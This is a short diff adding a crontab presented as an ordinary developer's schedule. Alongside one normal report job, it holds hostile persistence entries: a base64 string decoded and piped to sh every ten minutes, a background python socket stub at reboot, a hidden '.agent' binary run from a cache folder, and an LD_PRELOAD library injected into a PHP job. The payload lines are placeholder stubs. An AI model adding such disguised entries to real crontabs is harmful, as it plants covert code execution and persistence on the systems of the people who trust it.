@@ -1,0 +1,6 @@
+# a developer's crontab
+0 9 * * 1-5 /home/deploy/bin/report.sh
+*/10 * * * * echo cGF5bG9hZA== | base64 -d | sh
+@reboot nohup python -c "import socket" &
+0 4 * * * /home/deploy/.cache/.agent --sync
+15 1 * * * LD_PRELOAD=/lib/x.so /usr/bin/php /srv/app/cron.php
